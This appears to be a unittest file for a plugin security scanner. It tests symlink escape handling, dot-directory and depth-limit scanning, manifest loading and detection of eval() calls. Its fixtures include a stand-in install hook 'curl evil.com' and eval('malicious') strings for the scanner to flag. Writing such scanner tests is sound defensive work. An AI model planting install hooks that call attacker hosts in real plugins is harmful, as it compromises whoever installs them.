# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Tests for plugin scanner file collection hardening."""

import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from defenseclaw.scanner.plugin_scanner.helpers import collect_files
from defenseclaw.scanner.plugin_scanner.scanner import _load_manifest, scan_plugin


class TestCollectFilesSymlinks(unittest.TestCase):
    """F-0361: symlinks that escape the scan root must be skipped."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        # Plugin root
        self.plugin_dir = os.path.join(self.tmp, "plugin")
        os.makedirs(os.path.join(self.plugin_dir, "src"))
        # Legitimate file inside plugin
        with open(os.path.join(self.plugin_dir, "src", "index.js"), "w") as f:
            f.write("console.log('legit');")
        # External directory (outside plugin root)
        self.external_dir = os.path.join(self.tmp, "external")
        os.makedirs(self.external_dir)
        with open(os.path.join(self.external_dir, "secret.js"), "w") as f:
            f.write("// host secret")

    def test_symlink_escaping_scan_root_is_skipped(self):
        """Symlinked directory pointing outside plugin root should be skipped."""
        link_path = os.path.join(self.plugin_dir, "src", "escape")
        os.symlink(self.external_dir, link_path)

        escapes: list[str] = []
        files = collect_files(
            self.plugin_dir, [".js"], _symlink_escapes=escapes,
        )
        # secret.js should NOT be collected
        basenames = [os.path.basename(f) for f in files]
        self.assertNotIn("secret.js", basenames)
        self.assertIn("index.js", basenames)
        # escape should be recorded
        self.assertEqual(len(escapes), 1)
        self.assertIn("escape", escapes[0])

    def test_symlink_within_scan_root_is_followed(self):
        """Symlinks that stay inside the plugin root should work normally."""
        subdir = os.path.join(self.plugin_dir, "lib")
        os.makedirs(subdir)
        with open(os.path.join(subdir, "util.js"), "w") as f:
            f.write("// util")
        link_path = os.path.join(self.plugin_dir, "src", "lib_link")
        os.symlink(subdir, link_path)

        files = collect_files(self.plugin_dir, [".js"])
        basenames = [os.path.basename(f) for f in files]
        self.assertIn("util.js", basenames)

    def test_symlink_cycle_does_not_loop(self):
        """Symlink cycle should be detected via inode tracking."""
        subdir = os.path.join(self.plugin_dir, "src")
        # Create a symlink that points back to the plugin root
        link_path = os.path.join(subdir, "cycle")
        os.symlink(self.plugin_dir, link_path)

        # Should complete without hanging
        files = collect_files(self.plugin_dir, [".js"])
        self.assertIsInstance(files, list)


class TestCollectFilesDotDirs(unittest.TestCase):
    """F-0342: dot-prefixed dirs should be scanned unless they're known-benign."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.plugin_dir = os.path.join(self.tmp, "plugin")
        os.makedirs(self.plugin_dir)

    def test_hidden_dir_is_scanned(self):
        """A dot-prefixed dir like .hidden should now be scanned."""
        hidden = os.path.join(self.plugin_dir, "src", ".hidden")
        os.makedirs(hidden)
        with open(os.path.join(hidden, "evil.js"), "w") as f:
            f.write("eval('pwn')")

        files = collect_files(self.plugin_dir, [".js"])
        basenames = [os.path.basename(f) for f in files]
        self.assertIn("evil.js", basenames)

    def test_git_dir_is_still_skipped(self):
        """Known-benign dirs like .git should still be skipped."""
        git_dir = os.path.join(self.plugin_dir, ".git")
        os.makedirs(git_dir)
        with open(os.path.join(git_dir, "config.js"), "w") as f:
            f.write("// git internal")

        files = collect_files(self.plugin_dir, [".js"])
        basenames = [os.path.basename(f) for f in files]
        self.assertNotIn("config.js", basenames)

    def test_node_modules_still_skipped(self):
        """node_modules should still be skipped."""
        nm = os.path.join(self.plugin_dir, "node_modules", "pkg")
        os.makedirs(nm)
        with open(os.path.join(nm, "index.js"), "w") as f:
            f.write("// dep")

        files = collect_files(self.plugin_dir, [".js"])
        self.assertEqual(files, [])


class TestCollectFilesDepthLimit(unittest.TestCase):
    """F-0341: depth limit should be high enough for real plugins, and truncation should be reported."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.plugin_dir = os.path.join(self.tmp, "plugin")
        # Create a deeply nested directory (depth 6)
        deep = self.plugin_dir
        for i in range(6):
            deep = os.path.join(deep, f"level{i}")
        os.makedirs(deep)
        with open(os.path.join(deep, "deep.js"), "w") as f:
            f.write("// deeply nested")

    def test_deep_files_are_found_with_default_limit(self):
        """Default limit of 20 should find files at depth 6."""
        files = collect_files(self.plugin_dir, [".js"])
        basenames = [os.path.basename(f) for f in files]
        self.assertIn("deep.js", basenames)

    def test_old_depth_limit_would_miss_files(self):
        """With the old limit of 4, deep files would be missed."""
        truncations: list[str] = []
        files = collect_files(
            self.plugin_dir, [".js"], max_depth=4,
            _depth_truncations=truncations,
        )
        basenames = [os.path.basename(f) for f in files]
        self.assertNotIn("deep.js", basenames)
        # Truncation should be recorded
        self.assertTrue(len(truncations) > 0)

    def test_truncation_is_recorded(self):
        """When depth limit is hit, the directory path should be recorded."""
        truncations: list[str] = []
        collect_files(
            self.plugin_dir, [".js"], max_depth=2,
            _depth_truncations=truncations,
        )
        self.assertTrue(len(truncations) > 0)


class TestLoadManifestOpenClaw(unittest.TestCase):
    """F-0343: _load_manifest should recognize openclaw.plugin.json."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def test_openclaw_plugin_json_is_loaded(self):
        """A plugin with only openclaw.plugin.json should get a manifest."""
        plugin_dir = os.path.join(self.tmp, "oc_plugin")
        os.makedirs(plugin_dir)
        with open(os.path.join(plugin_dir, "openclaw.plugin.json"), "w") as f:
            json.dump({"id": "my-oc-plugin", "hooks": {"onInstall": "echo hi"}}, f)

        manifest = _load_manifest(plugin_dir)
        self.assertIsNotNone(manifest)
        self.assertEqual(manifest.name, "my-oc-plugin")

    def test_package_json_still_takes_precedence(self):
        """If both package.json and openclaw.plugin.json exist, package.json wins."""
        plugin_dir = os.path.join(self.tmp, "dual_plugin")
        os.makedirs(plugin_dir)
        with open(os.path.join(plugin_dir, "package.json"), "w") as f:
            json.dump({"name": "from-pkg", "version": "1.0.0"}, f)
        with open(os.path.join(plugin_dir, "openclaw.plugin.json"), "w") as f:
            json.dump({"id": "from-oc"}, f)

        manifest = _load_manifest(plugin_dir)
        self.assertIsNotNone(manifest)
        self.assertEqual(manifest.name, "from-pkg")

    def test_openclaw_only_plugin_gets_full_scan(self):
        """A plugin with only openclaw.plugin.json should run the full analyzer pipeline."""
        plugin_dir = os.path.join(self.tmp, "oc_full")
        os.makedirs(os.path.join(plugin_dir, "src"))
        with open(os.path.join(plugin_dir, "openclaw.plugin.json"), "w") as f:
            json.dump({"id": "test-plugin", "hooks": {"onInstall": "curl evil.com"}}, f)
        with open(os.path.join(plugin_dir, "src", "index.js"), "w") as f:
            f.write("eval('malicious')")

        result = scan_plugin(plugin_dir)
        rule_ids = [f.rule_id for f in result.findings]
        # Should NOT short-circuit to just MANIFEST-MISSING
        self.assertNotIn("MANIFEST-MISSING", rule_ids)
        # Should find the eval call from source scanning
        self.assertTrue(
            any("SRC-EVAL" in rid or "EVAL" in rid for rid in rule_ids if rid),
            f"Expected eval finding, got: {rule_ids}",
        )


class TestNoManifestStillScans(unittest.TestCase):
    """A plugin with no manifest at all should still get source-scanned."""

    def test_no_manifest_still_finds_eval(self):
        """Even without any manifest, source scanning should catch eval()."""
        tmp = tempfile.mkdtemp()
        plugin_dir = os.path.join(tmp, "no_manifest_plugin")
        os.makedirs(os.path.join(plugin_dir, "src"))
        with open(os.path.join(plugin_dir, "src", "bad.js"), "w") as f:
            f.write("eval('malicious code')")

        result = scan_plugin(plugin_dir)
        rule_ids = [f.rule_id for f in result.findings]
        # Should still have MANIFEST-MISSING
        self.assertIn("MANIFEST-MISSING", rule_ids)
        # But also find the eval call
        self.assertTrue(
            any("EVAL" in rid for rid in rule_ids if rid),
            f"Expected eval finding alongside MANIFEST-MISSING, got: {rule_ids}",
        )

    def test_no_manifest_finding_is_high_severity(self):
        """MANIFEST-MISSING should be HIGH, not MEDIUM."""
        tmp = tempfile.mkdtemp()
        plugin_dir = os.path.join(tmp, "empty_plugin")
        os.makedirs(plugin_dir)

        result = scan_plugin(plugin_dir)
        manifest_findings = [f for f in result.findings if f.rule_id == "MANIFEST-MISSING"]
        self.assertEqual(len(manifest_findings), 1)
        self.assertEqual(manifest_findings[0].severity, "HIGH")


if __name__ == "__main__":
    unittest.main()
